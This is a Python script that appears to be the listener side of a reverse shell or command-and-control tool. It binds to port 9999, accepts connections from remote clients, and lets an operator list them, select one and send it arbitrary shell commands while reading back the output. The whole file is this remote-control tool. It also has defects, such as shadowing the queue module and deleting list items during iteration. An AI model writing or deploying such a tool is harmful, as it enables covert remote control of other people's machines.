import socket
import threading
import queue

queue = queue.Queue()
NO_THREADS = 2
NO_JOBS = [1,2]

global host
global port
global sock
host = ""
port = 9999

total_connections = []
total_addresses = []
# create socket

def create_socket():
    try:
        global host,port,sock
        sock = socket.socket()
    except socket.error as msg:
        print("SERVER: socket error : " + str(msg))

def bind_socket():
    global  host, port

    try:
        sock.bind((host,port))
        sock.listen(10)
        print(" Socket bind to PORT: "+ str(port))

    except socket.error as msg:
        print("SERVER: Binding error : "+ str(msg))

def accept_conn():

    for conn in total_connections:
        conn.close()
    del total_connections[:]
    del total_addresses[:]

    try:
        while True:
            connection,sock_addr = sock.accept()
            sock.setblocking(1)
            total_connections.append(connection)
            total_addresses.append(sock_addr)
    except socket.error as msg:
        print("SERVER : Accpt_CONN failed : "+ str(msg))

def virt_cmd(): # Virtual command promt for handling connections( list , select, send)
    while True:
        inp_vcmd = input('virt-cmd >')

        if inp_vcmd == 'list':
            list_conn()

        elif 'select' in inp_vcmd:
            selected_conn = select_conn(inp_vcmd)

            if selected_conn is not None:
                send_commands(selected_conn)



def list_conn():
    active_conn = ""

    for i, conn in enumerate(total_connections):

        try:
            conn.send(str.encode(" "))
            conn.recv(2048)
        except:
            print(total_connections)
            del total_connections[i]
            del total_addresses[i]
            continue

        active_conn = str(i) + " -->" + str(total_addresses[i][0]) + " PORT : " + str(total_addresses[i][1])
    print("CLIENTS CONNECTED:\n", active_conn)


def select_conn(inp_vcmd):


    try:
        select_id = inp_vcmd.replace('select', '')
        select_id_int = int(select_id)
        conn_active = total_connections[select_id_int]
        print("CONNECTED TO :", str(total_addresses[select_id_int][0]))
        print(str(total_addresses[select_id_int][0]) + ">", end="")
        return conn_active

    except:
        print("SELECTION FAILED")
        return None

def send_commands(selected_conn):

    while True:
        try:
            s_data = input('')

            if s_data == 'quit':
                break

            if len(str.encode(s_data)) > 0:
                selected_conn.send(str.encode(s_data))
                c_response = str(selected_conn.recv(2048),"utf-8")
                print(c_response,end="")
        except:
            print("SENDING FAILED!!!!")
            break




# Create two threads for multitasking

def create_threads():

    for _ in range(NO_THREADS):
        thread = threading.Thread(target=job)
        thread.daemon = True
        thread.start()

def job():

    while True:

        job_no = queue.get()

        if job_no == 1:
            create_socket()
            bind_socket()
            accept_conn()

        if job_no == 2:
            virt_cmd()

        queue.task_done()

def create_jobs():

    for i in NO_JOBS:
        queue.put(i)

    queue.join()


create_threads()
create_jobs()





